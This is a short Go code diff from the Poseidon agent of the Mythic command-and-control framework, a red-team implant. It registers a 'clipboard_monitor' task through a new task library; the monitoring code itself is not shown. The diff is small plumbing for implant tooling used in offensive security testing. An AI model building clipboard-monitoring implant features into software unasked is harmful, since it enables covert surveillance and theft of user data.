@@ -8,10 +8,15 @@ import (
 
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/functions"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/tasks/library"
 )
 
 type Arguments struct {
 	Duration int `json:"duration"`
+}
+
+func init() {
+	library.RegisterTask("clipboard_monitor", Run)
 }
 
 func Run(task structs.Task) {
